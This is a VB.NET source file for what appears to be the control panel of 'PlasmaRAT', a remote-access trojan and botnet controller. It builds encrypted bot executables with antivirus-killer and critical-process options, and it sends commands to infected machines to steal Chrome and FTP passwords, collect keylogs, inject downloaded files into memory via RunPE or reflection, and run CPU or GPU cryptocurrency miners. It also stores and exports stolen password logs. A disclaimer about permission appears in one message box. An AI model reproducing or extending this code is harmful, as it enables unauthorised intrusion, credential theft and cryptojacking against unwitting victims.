        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(EncryptionKey))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function
    Private Sub ListView1_DrawSubItem(ByVal sender As System.Object, ByVal e As System.Windows.Forms.DrawListViewSubItemEventArgs) Handles NewsView.DrawSubItem
        Dim SB As New SolidBrush(e.SubItem.ForeColor)

        e.DrawBackground()
        e.Graphics.DrawString(e.SubItem.Text, e.SubItem.Font, SB, e.Bounds, Nothing)

        SB.Dispose()
    End Sub
    Private Sub ListView1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles NewsView.MouseMove
        If NewsView.GetItemAt(e.X, e.Y) Is Nothing Then
            NewsView.Cursor = Cursors.Default
        Else
            NewsView.Cursor = Cursors.Hand
        End If
    End Sub

    Private Sub NewsView_SelectedIndexChanged_2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewsView.Click
        If NewsView.SelectedIndices.Count = 0 Then Return
        ShowPostMessage(DirectCast(NewsView.SelectedItems(0).Tag, NewsPost))
    End Sub
    Private Sub ShowPostMessage(ByVal post As NewsPost)
        Dim Message As String = Seal.GetPostMessage(post.ID)

        If String.IsNullOrEmpty(Message) Then
            ShowNewsEntries()
        Else
            NewsHeader.Text = post.Name
            MessageBox.Show(Message, "News", MessageBoxButtons.OK, MessageBoxIcon.Information)

        End If
    End Sub
    Private Sub ShowNewsEntries()
        NewsView.Items.Clear()

        For Each P As NewsPost In Seal.News
            Dim I As New ListViewItem(P.Time.ToString("MM.dd.yy"))
            I.SubItems.Add(P.Name)
            I.Tag = P
            NewsView.Items.Add(I)
        Next
    End Sub

    Private Sub NewsView_SelectedIndexChanged_3(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewsView.SelectedIndexChanged

    End Sub

    Private Sub Pong_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Ping.Tick
        If PingPong.Checked = True Then
            If Not BotListView.Items.Count = 0 Then
                SendToAll("l")
            End If
        End If
    End Sub
    Sub AddClient(ByVal strings() As String)
        Try
            Dim l As New ListViewItem(strings)


            '     If Not BotListView.Items.Contains(l) Then




            BotListView.Items.Add(l)

        Catch : End Try
        '   End If
    End Sub
    Private Sub Button7_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        AddClient({"72.32.43.20", "USA", "Windows 7 x64", "Jacob", "4 Cores", "User", "1.5"})
        AddClient({"68.142.243.103", "USA", "Windows 7 x64", "me", "2 Cores", "User", "1.5"})
        AddClient({"98.136.63.35", "BRA", "Windows XP x86", "Administrator", "2 Cores", "Admin", "1.5"})
        AddClient({"87.248.125.49", "CAN", "Windows 7 x86", "Typer", "2 Cores", "User", "1.5"})
        AddClient({"217.146.191.19", "USA", "Windows Vista x64", "Emma", "4 Cores", "User", "1.5"})
        AddClient({"76.124.248.194", "ESP", "Windows XP x86", "Administrator", "1 Core", "Admin", "1.5"})
        AddClient({"93.91.250.134", "USA", "Windows Vista x86", "Aiden", "4 Cores", "User", "1.5"})
        AddClient({"176.31.209.33", "IRN", "Windows XP x86", "Noah", "4 Cores", "Admin", "1.5"})
        AddClient({"183.170.243.116", "USA", "Windows XP x86", "javadi", "2 Cores", "Admin", "1.5"})
        AddClient({"85.25.100.13", "USA", "Windows 7 x64", "tusbung", "8 Cores", "User", "1.5"})
        AddClient({"109.168.111.41", "BRA", "Windows 7 x64", "taye", "4 Cores", "User", "1.5"})
        AddClient({"94.23.71.216", "USA", "Windows XP x86", "Emily", "2 Cores", "Admin", "1.5"})
        AddClient({"5.135.142.32", "USA", "Windows 7 x86", "Avery", "4 Cores", "User", "1.5"})
        AddClient({"69.197.50.71", "VEN", "Windows Vista x86", "GANKK", "8 Cores", "User", "1.5"})
        AddClient({"198.23.247.55", "USA", "Windows 7 x64", "Administrator", "4 Cores", "User", "1.5"})
        AddClient({"71.174.59.38", "ARG", "Windows XP x86", "Andrew", "2 Cores", "Admin", "1.5"})


        While Not BotListView.Items.Count = 974
            Dim CurClient As New ListViewItem("127.0.0.1") ' Server ID


            CurClient.SubItems.Add("test") ' IP
            CurClient.SubItems.Add("Windows 8") ' OS
            CurClient.SubItems.Add("eadsf") ' User
            CurClient.SubItems.Add("ddd") ' User
            CurClient.SubItems.Add("xxx") ' User
            CurClient.SubItems.Add("aeasdf")




            BotListView.Items.Add(CurClient)
        End While
    End Sub

    Private Sub Label11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ResendCommandToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ResendCommandToolStripMenuItem.Click
        Dim commandtoSend As String

        If CommandsListView.SelectedItems.Count > 0 Then
            If Not CommandsListView.SelectedItems(0).Text = String.Empty Then

                commandtoSend = CommandsListView.SelectedItems(0).Text



                If MsgBox("Are you sure you want to resend the command: " & vbNewLine & commandtoSend & vbNewLine & "to all online bots?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
                    SendToAll(commandtoSend)


                End If

            End If
        End If
    End Sub

    Private Sub SendCommandOnConnectToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendCommandOnConnectToolStripMenuItem.Click
        If CommandsListView.SelectedItems.Count > 0 Then
            If Not CommandsListView.SelectedItems(0).Text = String.Empty Then
                Dim commandOnSend = CommandsListView.SelectedItems(0).Text

                If MsgBox("Are you sure you want to send the command: " & vbNewLine & commandOnSend & vbNewLine & "to bots as they connect?", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then


                    OnConnectCommand = commandOnSend
                    '    Commands.ToolStripDropDownAccessibleObject.ToolStripMenuItem11()
                    ToolStripMenuItem11.Text = "On-Join Command: " & OnConnectCommand

                End If
            End If
        End If

    End Sub

    Private Sub Button12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub


    Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
        ' USE THE STUB

        If BackupDNS.Text = String.Empty Then
            MessageBox.Show("You cannot have backup DNS textbox blank. Please cancel this build operation and put something in it, even if it is disabled!")
        End If

        Try
            Try : SaveSetting("PlasmaRAT", "Config", "DNS", DNSBuild.Text) : Catch : End Try
            Dim SettingsString As String = ""
            If EnableInstallation.Checked = True Then SettingsString = SettingsString & "z"
            If SetKernelObjectSecurity.Checked Then SettingsString = SettingsString & "q"
            If SWIP.Checked Then SettingsString = SettingsString & "i"
            If AVKiller.Checked Then SettingsString = SettingsString & "a"
            If BotResourceProtection.Checked Then SettingsString = SettingsString & "s"
            If AutomaticBK.Checked Then SettingsString = SettingsString & "bk"
            If SetProcessCritical.Checked Then SettingsString = SettingsString & "c"
            If EnableBackupDNS.Checked Then SettingsString = SettingsString & "y"
            Dim omgawd = "*"
            Dim compileinfo = Builder.EncryptConfig(omgawd & DNSBuild.Text & omgawd & PORTBuild.Text & omgawd & Seal.Username & omgawd & FileName.Text & omgawd & Folder.Text & omgawd & SettingsString & omgawd & BackupDNS.Text & omgawd)
            If compileinfo.Length < 300 Then

                While Not compileinfo.Length = 300
                    compileinfo = compileinfo & " "
                End While
                Dim WhatWereReplacing = System.Text.ASCIIEncoding.ASCII.GetBytes(Seal.GetVariable("StubDecryptionKey"))
                Dim WhatWereReplacingWith = System.Text.ASCIIEncoding.ASCII.GetBytes(compileinfo)
                Dim wget As New System.Net.WebClient()
                Dim Bin = wget.DownloadData(Seal.GetVariable("BACKUPDNS"))
                Dim Decryptedbin = Builder.Proper_RC4(Bin, System.Text.Encoding.UTF8.GetBytes(Seal.GetVariable("Test")))
                Using S As New SaveFileDialog With {.Filter = "*.exe | *.exe"}
                    If S.ShowDialog = 1 Then
                        My.Computer.FileSystem.WriteAllBytes(S.FileName, Builder.ReplaceBytes(Decryptedbin, WhatWereReplacing, WhatWereReplacingWith), False)
                        MessageBox.Show("Successfully Built Bot Bin at: " & S.FileName & vbNewLine & vbNewLine & "This is the file you run on other computers. When another computer runs this file, they will connect to you. Please only run this executable on computers which you have explict permission to do so on." & vbNewLine & vbNewLine & "DO NOT test this by running it on yourself! Use Sandboxie, or a virtual machine!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    End If
                End Using

            Else
                MessageBox.Show("Config too large. This is a very rare error.")
            End If


        Catch
            MessageBox.Show("Error Building Bin. Please restart Plasma and try again.")
        End Try

    End Sub

    Private Sub DNSBuild_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DNSBuild.Click
        If DNSBuild.Text = "example.no-ip.org" Then DNSBuild.Text = String.Empty
    End Sub

    Private Sub Button15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button15.Click
        If CPUMiner.Checked = True Then
            SendToAll("miner.stop")
        Else
            SendToAll("miner.gpu.stop")
        End If
    End Sub

    Private Sub Button14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button14.Click
        If Not MinerFiles.Text = String.Empty Then
            If Not MinerPool.Text = String.Empty Then
                If Not MinerUser.Text = String.Empty Then
                    If Not MinerPass.Text = String.Empty Then
                        SaveSetting("PlasmaRAT", "Config", "MinerSettings", MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)
                        If CPUMiner.Checked = True Then
                            SendToAll("miner.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)
                        Else
                            SendToAll("miner.gpu.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)
                        End If
                    End If
                End If
            End If
        End If


    End Sub

    Private Sub SendMinerOnConnect_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendMinerOnConnect.CheckedChanged
        If SendMinerOnConnect.Checked = True Then
            If CPUMiner.Checked = True Then
                OnConnectMiner = ("miner.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)
            End If
            If GPUMiner.Checked = True Then
                OnConnectMiner = ("miner.gpu.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)
            End If
            MinerFiles.ReadOnly = True
            MinerPool.ReadOnly = True
            MinerUser.ReadOnly = True
            MinerPass.ReadOnly = True
            CPUMiner.Enabled = False
            GPUMiner.Enabled = False
        Else
            OnConnectMiner = String.Empty
            MinerFiles.ReadOnly = False
            MinerPool.ReadOnly = False
            MinerUser.ReadOnly = False
            MinerPass.ReadOnly = False
            CPUMiner.Enabled = True
            GPUMiner.Enabled = True
        End If
    End Sub

    Private Sub MinerPool_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MinerPool.Click
        If MinerPool.Text = "stratum+tcp://ltc-stratum.examplepool.net" Then MinerPool.Text = String.Empty
    End Sub

    Private Sub Button16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button16.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=6")
    End Sub

    Private Sub ToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ToolStripMenuItem6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem6.Click
        BotLogs = String.Empty
        LogView.Items.Clear()
    End Sub

    Private Sub ToolStripMenuItem5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem5.Click
        If Not BotLogs = String.Empty Then My.Computer.Clipboard.SetText(BotLogs)
        MsgBox("Copied to Clipboard Successfully!")
    End Sub

    Private Sub ToolStripMenuItem9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem9.Click
        PasswordLogs = String.Empty
        PasswordListView.Items.Clear()
    End Sub

    Private Sub ToolStripMenuItem10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem10.Click
        If Not PasswordLogs = String.Empty Then My.Computer.Clipboard.SetText(PasswordLogs)
        MsgBox("Copied to Clipboard Successfully!")
    End Sub

    Private Sub ToolStripMenuItem13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem13.Click
        If Not CommandsLogs = String.Empty Then My.Computer.Clipboard.SetText(CommandsLogs)
        MsgBox("Copied to Clipboard Successfully!")
    End Sub

    Private Sub ToolStripMenuItem14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem14.Click
        CommandsLogs = String.Empty
        CommandsListView.Items.Clear()
    End Sub

    Private Sub ToolStripMenuItem12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem12.Click
        OnConnectCommand = String.Empty
        ToolStripMenuItem11.Text = "On-Join Command: N/A"
        '       OnConnectLabel.Text = "Command to Send on Connect: N/A"
    End Sub

    Private Sub OnConnectLabel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ToolStripMenuItem7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)


    End Sub

    Private Sub ToolStripMenuItem8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem8.Click
        If Not PasswordLogs = String.Empty Then

            Dim myStream As Stream
            Dim saveFileDialog1 As New SaveFileDialog()

            saveFileDialog1.Filter = "txt files (*.txt)|*.txt"
            saveFileDialog1.FilterIndex = 2
            saveFileDialog1.RestoreDirectory = True

            If saveFileDialog1.ShowDialog() = DialogResult.OK Then
                IO.File.WriteAllText(saveFileDialog1.FileName, PasswordLogs)
                MessageBox.Show("Passwords Exported Successfully!")
            End If
        End If









    End Sub

    Private Sub ToolStripMenuItem4_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem4.Click
        SendToAll("chrome")
    End Sub

    Private Sub ToolStripMenuItem7_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem7.Click
        SendToAll("ftp")
    End Sub
    Private Sub Folder_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Folder.Click
        Dim r As New Random
        '   Mutex.Text = r.Next(10000000, 999999999).ToString
        '  Folder.Text = "{$" & r.Next(1000, 9000).ToString & "-" & r.Next(1000, 9000).ToString & "-" & r.Next(1000, 9000).ToString & "-" & r.Next(1000, 9000) & "$}"
    End Sub

    Private Sub EnableInstallation_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableInstallation.CheckedChanged
        If EnableInstallation.Checked = True Then
            FileName.Enabled = True
            Folder.Enabled = True
            SWIP.Enabled = True
            AVKiller.Enabled = True
            BotResourceProtection.Enabled = True
            AutomaticBK.Enabled = True
            SetProcessCritical.Enabled = True

            SWIP.Checked = True
            AVKiller.Checked = True
            BotResourceProtection.Checked = True
            AutomaticBK.Checked = False
            SetProcessCritical.Checked = False

        Else
            FileName.Enabled = False
            Folder.Enabled = False
            SWIP.Enabled = False
            AVKiller.Enabled = False
            BotResourceProtection.Enabled = False
            AutomaticBK.Enabled = False
            SetProcessCritical.Enabled = False

            SWIP.Checked = False
            AVKiller.Checked = False
            BotResourceProtection.Checked = False
            AutomaticBK.Checked = False
            SetProcessCritical.Checked = False

        End If
    End Sub

    Private Sub RunHardBotKillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunHardBotKillerToolStripMenuItem.Click
        If MsgBox("Are you sure you want to run the Hard Bot Killer? This will hinder the installation of new files on the system. Please only use this on highly infected computers.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            SendToSelected("botkiller.hardbk")
        End If
    End Sub

    Private Sub InjectFileRunPEToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InjectFileRunPEToolStripMenuItem.Click
        Dim S As String = InputBox("File to Inject into Memory via RunPE (Direct Download Link):", "")
        If Not S = String.Empty Then
            SendToSelected("inject.runpe " & S)
        End If

    End Sub

    Private Sub InjectFileReflectionToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InjectFileReflectionToolStripMenuItem.Click
        Dim S As String = InputBox("File to Inject into Memory via Reflection (Direct Download Link):", "")
        If Not S = String.Empty Then
            SendToSelected("inject.reflect " & S)
        End If


    End Sub

    Private Sub StopMiningToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StopMiningToolStripMenuItem.Click
        If MsgBox("Start GPU Mining on Selected Bots? This will use the settings from the Miner Tab.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            If Not MinerFiles.Text = String.Empty Then
                If Not MinerPool.Text = String.Empty Then
                    If Not MinerUser.Text = String.Empty Then
                        If Not MinerPass.Text = String.Empty Then

                            SendToSelected("miner.gpu.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)

                        End If
                    End If
                End If
            End If



        End If
    End Sub

    Private Sub ToolStripMenuItem15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem15.Click
        If MsgBox("Start CPU Mining on Selected Bots? This will use the settings from the Miner Tab.", MsgBoxStyle.YesNo, "") = MsgBoxResult.Yes Then
            If Not MinerFiles.Text = String.Empty Then
                If Not MinerPool.Text = String.Empty Then
                    If Not MinerUser.Text = String.Empty Then
                        If Not MinerPass.Text = String.Empty Then

                            SendToSelected("miner.start " & MinerFiles.Text & " " & MinerPool.Text & " " & MinerUser.Text & " " & MinerPass.Text)

                        End If
                    End If
                End If
            End If



        End If
    End Sub

    Private Sub Button8_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        MessageBox.Show("Be sure to listen on this port before testing!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Process.Start("http://canyouseeme.org")
    End Sub

    Private Sub Button6_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Try
            Dim DNSIP = System.Net.Dns.GetHostByName(DNSBuild.Text).AddressList(0).ToString()
            Dim w As New System.Net.WebClient()
            Dim ip As String = w.DownloadString("http://api.wipmania.com/")
            Dim lol() = Split(ip, "<br>")
            Dim xd = lol(0)

            If DNSIP = xd Then
                MessageBox.Show("Your DNS is valid and resolves to your IP!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                MessageBox.Show("Your DNS is valid, but does not resolve to your IP. Your DNS may need time to update.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End If

        Catch ex As Exception
            MessageBox.Show("Unable to test DNS. You probably typed in an invalid DNS, or your internet is offline. Error info: " & vbNewLine & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub


    Private Sub StartListening_ButtonClick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListening.ButtonClick
        Try
            If Not StartListening.Text.Contains("Listening") Then
                Dim Msg = InputBox("Port to Listen on:", "Port to Listen on", PortToListenTo.ToString)
                If Not Msg = String.Empty Then
                    PortToListenTo = Convert.ToInt32(Msg)
                    listenerThread = New Thread(AddressOf Listen)
                    listenerThread.IsBackground = True
                    listenerThread.Start()
                    StartListening.Text = "Listening On: " & PortToListenTo.ToString
                    SaveSetting("PlasmaRAT", "Config", "Port", PortToListenTo.ToString)
                End If
            End If
        Catch ex As Exception
            MessageBox.Show("A strange issue as occured. Error details: " & vbNewLine & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub CPUMiner_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CPUMiner.CheckedChanged
        Dim lel() = Split(MinerFileURL, "|")
        If CPUMiner.Checked = True Then
            MinerFiles.Text = lel(0)
        Else
            MinerFiles.Text = lel(1)
        End If
    End Sub

    Private Sub GPUMiner_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GPUMiner.CheckedChanged

    End Sub

    Private Sub Button4_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        SendToAll("miner.reset")
    End Sub

    Private Sub LowBandwidth_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LowBandwidth.CheckedChanged
        If LowBandwidth.Checked = True Then
            SaveSetting("PlasmaRAT", "Config", "LowBandwidth", "Enabled")
        Else
            SaveSetting("PlasmaRAT", "Config", "LowBandwidth", String.Empty)
        End If

        If LowBandwidth.Checked = True Then
            Ping.Interval = 300000
        Else
            Ping.Interval = 60000
        End If
    End Sub

    Private Sub Button19_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button19.Click
        Process.Start("http://plasma.bz/forums/")
    End Sub

    Private Sub SingleConnection_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SingleConnection.MouseClick
        If SingleConnection.Checked = True Then
            SaveSetting("PlasmaRAT", "Config", "SingleConnection", String.Empty)
        Else
            SaveSetting("PlasmaRAT", "Config", "SingleConnection", "Disabled")
        End If
    End Sub

    Private Sub PingPong_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PingPong.MouseClick
        If PingPong.Checked = True Then
            SaveSetting("PlasmaRAT", "Config", "PingPong", String.Empty)
        Else
            SaveSetting("PlasmaRAT", "Config", "PingPong", "Disabled")
        End If
    End Sub

    Private Sub ClientOnError_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClientOnError.MouseClick
        If ClientOnError.Checked = True Then
            SaveSetting("PlasmaRAT", "Config", "DisconnectonError", String.Empty)
        Else
            SaveSetting("PlasmaRAT", "Config", "DisconnectonError", "Disabled")
        End If
    End Sub
    Private Sub SortBotListView(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs) Handles BotListView.ColumnClick
        ' Get the new sorting column. 
        Dim new_sorting_column As ColumnHeader = BotListView.Columns(e.Column)
        ' Figure out the new sorting order. 
        Dim sort_order As System.Windows.Forms.SortOrder
        If BotViewSort Is Nothing Then
            ' New column. Sort ascending. 
            sort_order = SortOrder.Ascending
        Else ' See if this is the same column. 
            If new_sorting_column.Equals(BotViewSort) Then
                ' Same column. Switch the sort order. 
                If BotViewSort.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending. 
                sort_order = SortOrder.Ascending
            End If
            ' Remove the old sort indicator. 
            BotViewSort.Text = BotViewSort.Text.Substring(2)
        End If
        ' Display the new sort order. 
        BotViewSort = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            BotViewSort.Text = "> " & BotViewSort.Text
        Else
            BotViewSort.Text = "< " & BotViewSort.Text
        End If
        ' Create a comparer. 
        BotListView.ListViewItemSorter = New clsListviewSorter(e.Column, sort_order)
        ' Sort. 
        BotListView.Sort()
    End Sub
    Private Sub LogViewSort(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs) Handles LogView.ColumnClick
        ' Get the new sorting column. 
        Dim new_sorting_column As ColumnHeader = LogView.Columns(e.Column)
        ' Figure out the new sorting order. 
        Dim sort_order As System.Windows.Forms.SortOrder
        If LogViewerSort Is Nothing Then
            ' New column. Sort ascending. 
            sort_order = SortOrder.Ascending
        Else ' See if this is the same column. 
            If new_sorting_column.Equals(LogViewerSort) Then
                ' Same column. Switch the sort order. 
                If LogViewerSort.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending. 
                sort_order = SortOrder.Ascending
            End If
            ' Remove the old sort indicator. 
            LogViewerSort.Text = LogViewerSort.Text.Substring(2)
        End If
        ' Display the new sort order. 
        LogViewerSort = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            LogViewerSort.Text = "> " & LogViewerSort.Text
        Else
            LogViewerSort.Text = "< " & LogViewerSort.Text
        End If
        ' Create a comparer. 
        LogView.ListViewItemSorter = New clsListviewSorter(e.Column, sort_order)
        ' Sort. 
        LogView.Sort()
    End Sub
    Private Sub ListView1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs) Handles PasswordListView.ColumnClick
        ' Get the new sorting column. 
        Dim new_sorting_column As ColumnHeader = PasswordListView.Columns(e.Column)
        ' Figure out the new sorting order. 
        Dim sort_order As System.Windows.Forms.SortOrder
        If PasswordViewSort Is Nothing Then
            ' New column. Sort ascending. 
            sort_order = SortOrder.Ascending
        Else ' See if this is the same column. 
            If new_sorting_column.Equals(PasswordViewSort) Then
                ' Same column. Switch the sort order. 
                If PasswordViewSort.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending. 
                sort_order = SortOrder.Ascending
            End If
            ' Remove the old sort indicator. 
            PasswordViewSort.Text = PasswordViewSort.Text.Substring(2)
        End If
        ' Display the new sort order. 
        PasswordViewSort = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            PasswordViewSort.Text = "> " & PasswordViewSort.Text
        Else
            PasswordViewSort.Text = "< " & PasswordViewSort.Text
        End If
        ' Create a comparer. 
        PasswordListView.ListViewItemSorter = New clsListviewSorter(e.Column, sort_order)
        ' Sort. 
        PasswordListView.Sort()
    End Sub

    Private Sub ToolStripMenuItem16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem16.Click
        SendToSelected("RECONNECT")
    End Sub

    Private Sub DownloadKeylogsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadKeylogsToolStripMenuItem.Click

    End Sub

    Private Sub PortForwardingTestToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PortForwardingTestToolStripMenuItem.Click
        MessageBox.Show("Be sure to listen on the port before testing it!", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Process.Start("http://canyouseeme.org/")
    End Sub

    Private Sub Button17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button17.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=2")
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=304")
    End Sub

    Private Sub Button9_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=383")
    End Sub

    Private Sub Button12_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=11")
    End Sub

    Private Sub ConnectionHelpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ConnectionHelpToolStripMenuItem.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=6")
    End Sub

    Private Sub Button20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TestBackupDNS.Click
        Try
            Dim DNSIP = System.Net.Dns.GetHostByName(BackupDNS.Text).AddressList(0).ToString()
            Dim w As New System.Net.WebClient()
            Dim ip As String = w.DownloadString("http://api.wipmania.com/")
            Dim lol() = Split(ip, "<br>")
            Dim xd = lol(0)

            If DNSIP = xd Then
                MessageBox.Show("Your DNS is valid and resolves to your IP!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                MessageBox.Show("Your DNS is valid, but does not resolve to your IP. Your DNS may need time to update.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End If

        Catch ex As Exception
            MessageBox.Show("Unable to test DNS. You probably typed in an invalid DNS, or your internet is offline. Error info: " & vbNewLine & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub EnableBackupDNS_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EnableBackupDNS.Click
        If EnableBackupDNS.Checked = True Then
            TestBackupDNS.Enabled = True
            BackupDNS.Enabled = True
        Else
            TestBackupDNS.Enabled = False
            BackupDNS.Enabled = False
        End If
    End Sub

  
    Private Sub BackupDNS_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BackupDNS.Click
        If BackupDNS.Text = "example.no-ip.org" Then BackupDNS.Text = String.Empty
    End Sub

    Private Sub Button18_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button18.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=381")
    End Sub

    Private Sub Button11_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        Process.Start("http://plasma.bz/forums/showthread.php?tid=382")
    End Sub
End Class
